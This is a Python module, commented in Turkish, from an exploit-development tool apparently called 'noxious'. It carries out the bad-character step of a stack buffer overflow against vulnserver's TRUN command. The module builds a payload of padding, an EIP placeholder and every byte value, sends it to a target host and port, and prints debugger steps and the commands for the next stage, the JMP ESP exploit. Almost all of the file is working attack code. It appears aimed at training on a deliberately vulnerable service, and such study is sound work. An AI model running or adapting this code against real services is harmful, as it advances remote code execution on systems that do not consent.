#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
noxious kötü karakter analiz modülü - bad character tespiti
"""

from typing import List, Optional

from cekirdek.gunluk import Gunluk
from cekirdek.baglanti import BaglantiYoneticisi, BaglantiHatasi
from cekirdek.yardimcilar import kotu_karakter_olustur, hex_goster


def karakter_analizi_baslat(
    hedef_ip: str,
    hedef_port: int,
    offset: int = 2003,
    komut: str = "TRUN",
    haric_karakterler: Optional[List[int]] = None,
    zaman_asimi: float = 5.0,
    gunluk: Optional[Gunluk] = None,
) -> bytes:
    """
    kötü karakter tespiti için tüm byte değerlerini gönderir

    süreç:
        1. belirtilen karakterler hariç 0x01-0xff arası tüm byte'ları üretir
        2. offset kadar 'A' + 4 byte 'B' (eip) + karakter dizisi şeklinde payload oluşturur
        3. payload'ı hedef servise gönderir
        4. debugger'da esp'yi takip ederek kesilen/bozulan byte'ları tespit edilebilir

    parametreler:
        hedef_ip: hedef sunucu ip adresi
        hedef_port: hedef sunucu port numarası
        offset: eip offset değeri (daha önce bulunan)
        komut: vulnserver komutu
        haric_karakterler: hariç tutulacak byte listesi (ör: [0x00, 0x0a])
        zaman_asimi: bağlantı zaman aşımı
        gunluk: loglama nesnesi

    döndürür:
        gönderilen kötü karakter byte dizisi
    """
    log = gunluk or Gunluk()

    if haric_karakterler is None:
        haric_karakterler = []

    log.baslik("kötü karakter analizi")
    log.bilgi(f"hedef          : {hedef_ip}:{hedef_port}")
    log.bilgi(f"komut          : {komut}")
    log.bilgi(f"eip offset     : {offset}")

    # hariç tutulan karakterleri göster
    haric_gosterim = ", ".join(
        f"\\x{k:02x}" for k in sorted(set(haric_karakterler) | {0x00})
    )
    log.bilgi(f"hariç tutulan  : {haric_gosterim}")
    log.bos_satir()

    # karakter dizisi oluştur
    karakter_dizisi = kotu_karakter_olustur(haric_karakterler)
    log.bilgi(f"test karakter sayısı: {len(karakter_dizisi)} byte")
    log.bos_satir()

    # hex dump göster
    log.bilgi("gönderilecek karakter dizisi:")
    log.bos_satir()
    print(hex_goster(karakter_dizisi))
    log.bos_satir()

    # payload oluştur: [komut] + [offset kadar a] + [4 byte b (eip)] + [karakterler]
    dolgu = b"A" * offset
    eip_yer_tutucu = b"B" * 4
    komut_bayt = f"{komut} /.:/".encode("latin-1")

    payload = komut_bayt + dolgu + eip_yer_tutucu + karakter_dizisi
    log.bilgi(f"toplam payload boyutu: {len(payload)} byte")
    log.bilgi(f"  komut kısmı    : {len(komut_bayt)} byte")
    log.bilgi(f"  dolgu (A)      : {len(dolgu)} byte")
    log.bilgi(f"  eip (B)        : {len(eip_yer_tutucu)} byte")
    log.bilgi(f"  test karakteri : {len(karakter_dizisi)} byte")
    log.bos_satir()

    # hedef erişilebilirlik kontrolü
    baglanti = BaglantiYoneticisi(hedef_ip, hedef_port, zaman_asimi, log)
    if not baglanti.hedef_eriselebilir_mi():
        log.hata(f"hedef erişilemiyor: {hedef_ip}:{hedef_port}")
        return karakter_dizisi

    # gönder
    log.bilgi("payload gönderiliyor...")

    try:
        gonderici = BaglantiYoneticisi(hedef_ip, hedef_port, zaman_asimi, log)
        gonderici.baglan_ve_gonder(payload, deneme_sayisi=1)
        log.basari("payload başarıyla gönderildi")
    except BaglantiHatasi as hata:
        log.hata(f"gönderim başarısız: {hata}")
        return karakter_dizisi

    log.bos_satir()
    log.ayirici()
    log.bilgi("yapmanız gerekenler:")
    log.bilgi("  1. debugger'da esp register'ını sağ tıklayın")
    log.bilgi("  2. 'follow in dump' seçeneğini seçin")
    log.bilgi("  3. hex dump'ta sıralı byte akışını kontrol edin")
    log.bilgi("  4. kesilen veya atlanan byte'ları not edin")
    log.bos_satir()
    log.bilgi("kötü karakter bulduysanız, hariç tutarak tekrar çalıştırın:")
    log.bilgi(
        f"  python3 noxious.py karakter --hedef {hedef_ip} "
        f"--port {hedef_port} --offset {offset} "
        f"--haric 0a,0d"
    )
    log.bos_satir()
    log.bilgi("tüm kötü karakterler tespit edildikten sonra exploit aşamasına geçin:")
    log.bilgi(
        f"  python3 noxious.py exploit --hedef {hedef_ip} "
        f"--port {hedef_port} --offset {offset} "
        f"--jmp-adresi <JMP_ESP_ADRESI>"
    )

    return karakter_dizisi
